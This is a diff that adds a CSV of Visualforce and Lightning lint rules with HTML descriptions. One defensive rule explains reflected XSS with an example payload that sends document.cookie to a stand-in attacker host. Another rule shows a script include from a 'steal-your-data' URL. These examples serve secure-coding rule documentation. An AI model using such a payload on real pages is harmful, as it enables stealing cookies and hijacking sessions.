@@ -1,0 +1,332 @@
+﻿rules_key,rules_name,rules_mdDesc,rules_severity,rules_langName,rules_type,nCino Specific
+vf:MouseEventWithoutKeyboardEquivalentCheck,Mouse Events should have Equivalent Keyboard Events,"Offering the same experience with the mouse and the keyboard allow users to pick their preferred device.
+Additionally, users of assistive technology will also be able to browse the site even if they cannot use the mouse.
+    
+
+<p>The following code:</p>
+
+<pre>
+&lt;a onClick=""doSomething();"" ...&gt;                                //Bad: 'onKeyPress' is missing.
+&lt;a onMouseover=""doSomething();"" ...&gt;                            //Bad: 'onFocus' is missing.
+&lt;a onMouseout=""doSomething();"" ...&gt;                             //Bad: 'onBlur' is missing.
+</pre>
+
+<p>should be refactored into:</p>
+
+<pre>
+&lt;a onClick=""doSomething();"" onKeyPress=""doSomething();"" ...&gt;    //Good: preferred approach.
+&lt;a onMouseover=""doSomething();"" onFocus=""doSomething();"" ...&gt;   //Good: preferred approach.
+&lt;a onMouseout=""doSomething();"" onBlur=""doSomething();"" ...&gt;     //Good: preferred approach.
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-extra-boolean-cast,disallow unnecessary boolean casts,"<p>In contexts such as an <code>if</code> statement's test where the result of the expression will already be coerced to a Boolean, casting to a Boolean via double negation (<code>!!</code>) or a <code>Boolean</code> call is unnecessary. For example, these <code>if</code> statements are equivalent:</p>
+<pre><code class=""js language-js"">if (!!foo) {
+    // ...
+}
+
+if (Boolean(foo)) {
+    // ...
+}
+
+if (foo) {
+    // ...
+}
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows unnecessary boolean casts.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-extra-boolean-cast: ""error""*/
+
+var foo = !!!bar;
+
+var foo = !!bar ? baz : bat;
+
+var foo = Boolean(!!bar);
+
+var foo = new Boolean(!!bar);
+
+if (!!foo) {
+    // ...
+}
+
+if (Boolean(foo)) {
+    // ...
+}
+
+while (!!foo) {
+    // ...
+}
+
+do {
+    // ...
+} while (Boolean(foo));
+
+for (; !!foo; ) {
+    // ...
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-extra-boolean-cast: ""error""*/
+
+var foo = !!bar;
+var foo = Boolean(bar);
+
+function foo() {
+    return !!bar;
+}
+
+var foo = bar ? !!baz : !!bat;
+</code></pre>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-obj-calls,disallow calling global object properties as functions,"<p>ECMAScript provides several global objects that are intended to be used as-is. Some of these objects look as if they could be constructors due their capitalization (such as <code>Math</code> and <code>JSON</code>) but will throw an error if you try to execute them as functions.</p>
+<p>The <a href=""https://es5.github.io/#x15.8"">ECMAScript 5 specification</a> makes it clear that both <code>Math</code> and <code>JSON</code> cannot be invoked:</p>
+<blockquote>
+  <p>The Math object does not have a <code>[[Call]]</code> internal property; it is not possible to invoke the Math object as a function.</p>
+</blockquote>
+<p>And the <a href=""https://www.ecma-international.org/ecma-262/6.0/index.html#sec-reflect-object"">ECMAScript 2015 specification</a> makes it clear that <code>Reflect</code> cannot be invoked:</p>
+<blockquote>
+  <p>The Reflect object also does not have a <code>[[Call]]</code> internal method; it is not possible to invoke the Reflect object as a function.</p>
+</blockquote>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows calling the <code>Math</code>, <code>JSON</code> and <code>Reflect</code> objects as functions.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-obj-calls: ""error""*/
+
+var math = Math();
+var json = JSON();
+var reflect = Reflect();
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-obj-calls: ""error""*/
+
+function area(r) {
+    return Math.PI * r * r;
+}
+var object = JSON.parse(""{}"");
+var value = Reflect.get({ x: 1, y: 2 }, ""x"");
+</code></pre>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li><a href=""https://es5.github.io/#x15.8"">The Math Object</a></li>
+</ul>",MINOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-unreachable,"disallow unreachable code after `return`, `throw`, `continue`, and `break` statements","<p>Because the <code>return</code>, <code>throw</code>, <code>break</code>, and <code>continue</code> statements unconditionally exit a block of code, any statements after them cannot be executed. Unreachable statements are usually a mistake.</p>
+<pre><code class=""js language-js"">function fn() {
+    x = 1;
+    return x;
+    x = 3; // this will never execute
+}
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows unreachable code after <code>return</code>, <code>throw</code>, <code>continue</code>, and <code>break</code> statements.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-unreachable: ""error""*/
+
+function foo() {
+    return true;
+    console.log(""done"");
+}
+
+function bar() {
+    throw new Error(""Oops!"");
+    console.log(""done"");
+}
+
+while(value) {
+    break;
+    console.log(""done"");
+}
+
+throw new Error(""Oops!"");
+console.log(""done"");
+
+function baz() {
+    if (Math.random() &lt; 0.5) {
+        return;
+    } else {
+        throw new Error();
+    }
+    console.log(""done"");
+}
+
+for (;;) {}
+console.log(""done"");
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule, because of JavaScript function and variable hoisting:</p>
+<pre><code class=""js language-js"">/*eslint no-unreachable: ""error""*/
+
+function foo() {
+    return bar();
+    function bar() {
+        return 1;
+    }
+}
+
+function bar() {
+    return x;
+    var x;
+}
+
+switch (foo) {
+    case 1:
+        break;
+        var x;
+}
+</code></pre>",MAJOR,Visual Force & Lightning,BUG,FALSE
+vf:HotspotGetSessionIdUsage,Using GETSESSIONID() and $API.Session_Id is security-sensitive,"The use of GETSESSIONID() and $API.Session_Id is security-sensitive. Ensure that you need to do this.
+
+<h2>See</h2>
+<ul>
+  <li> <a href=""http://cwe.mitre.org/data/definitions/807"">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision </li>
+  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
+  <li> OWASP Top 10 2021 Category A7 - Identification and Authentication Failures  </li>
+</ul>",MAJOR,Visual Force & Lightning,SECURITY_HOTSPOT,FALSE
+vf:CrossSiteScriptingReflected,JavaScript Reflected XSS,"Reflected Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a single HTTP response.<br/>
+    	<br/>
+    	<h2>See</h2>
+    	<ul>
+    	  <li> <a href=""https://developer.salesforce.com/docs/atlas.en-us.pages.meta/pages/pages_security_tips_xss.htm"">Cross Site Scripting (XSS)</a></li>
+		  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
+		  ('Eval Injection') </li>
+		  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
+		  ('Unsafe Reflection') </li>
+		  <li> OWASP Top 10 2021 Category A03 - Injection </li>
+		  
+		</ul>
+
+    <BR><h2>Example:</h2><pre>
+
+<script>var foo = '{!$CurrentPage.parameters.userparam}';</script>    //Bad: Javascript does not have built in protections.
+                                                                      
+// If userparam was given the value ""1';document.location='http://www.attacker.com/cgi-bin/cookie.cgi?'%2Bdocument.cookie;var%20foo='2""
+// all of the cookies for the current page would be sent to www.attacker.com.
+                                                                      
+
+
+    </pre>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
+vf:UnencodedStyle,Unencoded Formulas In Style Tags XSS,"Makes sure that all values obtained from URL parameters are properly escaped / sanitized to avoid XSS attacks.<br/>
+Input can be sanitized with JSENCODE().<br/>
+<br/>
+Using unescaped parameters can be a security risk.
+<h2>See</h2>
+<ul>
+  <li> <a href=""https://developer.salesforce.com/docs/atlas.en-us.pages.meta/pages/pages_security_tips_scontrols.htm"">Unescaped Output and Formulas in Visualforce Pages</a></li>
+  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
+  ('Eval Injection') </li>
+  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
+  ('Unsafe Reflection') </li>
+  <li> OWASP Top 10 2021 Category A03 - Injection </li>
+  
+</ul>
+
+
+      <BR><h2>Example:</h2><pre>
+
+&lt;style&gt;
+	  .xyz {
+	    color: #{!$CurrentPage.parameters.userInput}; //Bad: This is vulnerable to XSS.
+	  }
+&lt;/style&gt;
+
+&lt;style&gt;
+	  .xyz {
+	    color: #{!JSENCODE($CurrentPage.parameters.userInput)}; //Good: This is encoded with JSENCODE.
+	  }
+&lt;/style&gt;
+
+    </pre>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
+vf:AvoidExternalResources,External Script and Style Resources Should Be Avoided,"Including content from untrusted sources can lead to various security issues including include injection of malware,
+		information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware.<BR/>
+		<BR/>
+		All script and style resources must be loaded via static resources.<BR/>
+		Do not load these resources via script tags or links. <BR/>
+
+<h2>See</h2>		
+<ul>
+  <li> <a href=""http://cwe.mitre.org/data/definitions/829"">MITRE, CWE-829</a> - Inclusion of Functionality from Untrusted Control Sphere </li>
+  <li> OWASP Top 10 2021 Category A3 - Injection </li>
+  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
+</ul>
+    <BR><h2>Example:</h2><pre>
+	
+&lt;aura:component&gt;
+
+  &lt;ltng:require 
+    styles=""https://blah.com/css""    //Bad: This is not recommended.
+    scripts=""{!$Resource.example_js}""  //Good: Uses a static resource.
+    afterScriptsLoaded=""{!c.scriptsLoaded}"" /&gt;
+    
+&lt;/aura:component&gt;
+
+&lt;apex:page&gt;
+
+  &lt;apex:includeScript value=""http://risky.com/steal-your-data.js""/&gt; //Bad: This is not recommended.
+  &lt;apex:stylesheet value=""http://good.good.styles.com/css"" /&gt;  //Bad: This is not recommended.
+
+  &lt;apex:includeScript value=""{!$Resource.example_js}""/&gt;    //Good: Uses a static resource.
+  &lt;apex:stylesheet value=""{!$Resource.customCSS}"" /&gt;      //Good: Uses a static resource.
+  
+&lt;/apex:page&gt;
+
+
+
+
+
+    </pre>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
+cs-vf:secure-document,validate document global access,"<p>This rule makes sure that only supported properties and functions are used to access the document global.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>When the rule is enabled, unsupported calls or API objects are disallowed.  Your Lightning components are permitted to use:</p>
+<ul>
+<li>Standard Lightning Component Framework features.</li>
+<li>Standard Javascript features.</li>
+<li>Standard Locker Service SecureObject object features. </li>
+</ul>
+<p>All disallowed uses are shown in red on this <a href=""http://documentation.auraframework.org/lockerApiTest/index.app?aura.mode=DEV"">Document vs SecureDocument Compatibility Table</a>.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">var curScriptElement = document.currentScript; //Using document.currentScript is disallowed.
+</code></pre>",BLOCKER,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-extend-native,disallow extending native types,"<p>In JavaScript, you can extend any object, including builtin or ""native"" objects. Sometimes people change the behavior of these native objects in ways that break the assumptions made about them in other parts of the code.</p>
+<p>For example here we are overriding a builtin method that will then affect all Objects, even other builtins.</p>
+<pre><code class=""js language-js"">// seems harmless
+Object.prototype.extra = 55;
+
+// loop through some userIds
+var users = {
+    ""123"": ""Stan"",
+    ""456"": ""David""
+};
+
+// not what you'd expect
+for (var id in users) {
+    console.log(id); // ""123"", ""456"", ""extra""
+}
+</code></pre>
+<p>A common suggestion to avoid this problem would be to wrap the inside of the <code>for</code> loop with <code>users.hasOwnProperty(id)</code>. However, if this rule is strictly enforced throughout your codebase you won't need to take that step.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>Disallows directly modifying the prototype of builtin objects.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-extend-native: ""error""*/
+
+Object.prototype.a = ""a"";
+Object.defineProperty(Array.prototype, ""times"", { value: 999 });
+</code></pre>
+<h2 id=""options"">Options</h2>
+<p>This rule accepts an <code>exceptions</code> option, which can be used to specify a list of builtins for which extensions will be allowed.</p>
+<h3 id=""exceptions"">exceptions</h3>
+<p>Examples of <strong>correct</strong> code for the sample <code>{ ""exceptions"": [""Object""] }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-extend-native: [""error"", { ""exceptions"": [""Object""] }]*/
+
+Object.prototype.a = ""a"";
+</code></pre>
+<h2 id=""knownlimitations"">Known Limitations</h2>
+<p>This rule <em>does not</em> report any of the following less obvious approaches to modify the prototype of builtin objects:</p>
+<pre><code class=""js language-js"">var x = Object;
+x.prototype.thing = a;
+
+eval(""Array.prototype.forEach = 'muhahaha'"");
+
+with(Array) {
+    prototype.thing = 'thing';
+};
+
+window.Function.prototype.bind = 'tight';
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>You may want to disable this rule when working with polyfills that try to patch older versions of JavaScript with the latest spec, such as those that might <code>Function.prototype.bind</code> or <code>Array.prototype.forEach</code> in a future-friendly way.</p>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
